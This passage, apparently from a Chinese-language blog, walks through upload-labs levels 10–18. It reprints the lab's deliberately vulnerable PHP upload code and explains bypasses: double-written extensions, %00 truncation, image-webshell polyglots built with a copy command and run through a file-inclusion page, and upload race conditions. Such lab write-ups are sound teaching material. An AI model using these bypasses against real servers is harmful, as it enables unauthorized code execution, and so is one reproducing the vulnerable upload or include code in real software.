&#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920</span><br></code></pre></td></tr></table></figure>

<p>黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过<br><img src="https://img-blog.csdnimg.cn/20190619082922259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619083032640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11-00截断"></a>Pass-11-00截断</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    $file_ext = substr($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;<br>        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        $img_path = $_GET[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819</span><br></code></pre></td></tr></table></figure>

<p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$img_path = $_GET[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br>截断条件：php版本小于<span class="hljs-number">5.3</span><span class="hljs-number">.4</span>，php的magic_quotes_gpc为OFF状态<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019061908535953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619085428879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12-00截断"></a>Pass-12-00截断</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    $file_ext = substr($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;<br>        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        $img_path = $_POST[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819</span><br></code></pre></td></tr></table></figure>

<p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。<br><img src="https://img-blog.csdnimg.cn/2019061909071992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2019061909081330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619090907698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13-图片马绕过"></a>Pass-13-图片马绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params">$filename</span>)</span>&#123;<br>    $file = fopen($filename, <span class="hljs-string">&quot;rb&quot;</span>);<br>    $bin = fread($file, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br>    fclose($file);<br>    $strInfo = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, $bin);    <br>    $typeCode = intval($strInfo[<span class="hljs-string">&#x27;chars1&#x27;</span>].$strInfo[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    <br>    $fileType = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>($typeCode)&#123;      <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            $fileType = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            $fileType = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            $fileType = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            $fileType = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> $fileType;<br>&#125;<br><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $file_type = getReailFileType($temp_file);<br><br>    <span class="hljs-keyword">if</span>($file_type == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        $msg = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_type;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></code></pre></td></tr></table></figure>

<p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马：</p>
<blockquote>
<p>copy 22.jpg /b + 1.php /a shell.jpg</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20190619092253865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">##include.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="hljs-comment">*/</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br>$file = $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($file))&#123;<br>    <span class="hljs-keyword">include</span> $file;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(<span class="hljs-keyword">__file__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-number">123456789101112</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190619092621502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14-getimagesize()-图片马"></a>Pass-14-getimagesize()-图片马</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params">$filename</span>)</span>&#123;<br>    $types = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(file_exists($filename))&#123;<br>        $info = getimagesize($filename);<br>        $ext = image_type_to_extension($info[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">if</span>(stripos($types,$ext)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> $ext;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $res = isImage($temp_file);<br>    <span class="hljs-keyword">if</span>(!$res)&#123;<br>        $msg = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).$res;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920212223242526272829303132</span><br></code></pre></td></tr></table></figure>

<p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13<br><img src="https://img-blog.csdnimg.cn/20190619094339987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-15-exif-imagetype-图片马"><a href="#Pass-15-exif-imagetype-图片马" class="headerlink" title="Pass-15-exif_imagetype()-图片马"></a>Pass-15-exif_imagetype()-图片马</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params">$filename</span>)</span>&#123;<br>    <span class="hljs-comment">//需要开启php_exif模块</span><br>    $image_type = exif_imagetype($filename);<br>    <span class="hljs-keyword">switch</span> ($image_type) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $res = isImage($temp_file);<br>    <span class="hljs-keyword">if</span>(!$res)&#123;<br>        $msg = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$res;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536</span><br></code></pre></td></tr></table></figure>

<p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13<br><img src="https://img-blog.csdnimg.cn/20190619095026297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16-二次渲染绕过"></a>Pass-16-二次渲染绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    $filename = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    $filetype = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    $tmpname = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    $target_path=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.basename($filename);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    $fileext= substr(strrchr($filename,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            $im = imagecreatefromjpeg($target_path);<br><br>            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;<br>                $msg = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @unlink($target_path);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                $newfilename = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;<br>                imagejpeg($im,$img_path);<br>                @unlink($target_path);<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            $im = imagecreatefrompng($target_path);<br><br>            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;<br>                $msg = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @unlink($target_path);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                $newfilename = strval(rand()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;<br>                imagepng($im,$img_path);<br><br>                @unlink($target_path);<br>                $is_upload = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            $im = imagecreatefromgif($target_path);<br>            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;<br>                $msg = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @unlink($target_path);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                $newfilename = strval(rand()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;<br>                imagegif($im,$img_path);<br><br>                @unlink($target_path);<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $msg = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485</span><br></code></pre></td></tr></table></figure>

<p>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，具体可以参考<a href="https://xz.aliyun.com/t/2657#toc-13">这篇文章</a>，可是在复现的时候还是因为二次渲染以后php代码还是出被修改。</p>
<h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17-条件竞争"></a>Pass-17-条件竞争</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $file_ext = substr($file_name,strrpos($file_name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    $upload_file = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $file_name;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;<br>        <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;<br>             $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br>             rename($upload_file, $img_path);<br>             $is_upload = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            unlink($upload_file);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324</span><br></code></pre></td></tr></table></figure>

<p>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可<br><img src="https://img-blog.csdnimg.cn/20190619101858627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619101917177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    $imgFileName =time();<br>    $u = <span class="hljs-keyword">new</span> MyUpload($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],$imgFileName);<br>    $status_code = $u-&gt;upload(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> ($status_code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            $is_upload = <span class="hljs-literal">true</span>;<br>            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            $msg = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>            $msg = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-2</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-3</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-4</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-5</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-6</span>:<br>            $msg = <span 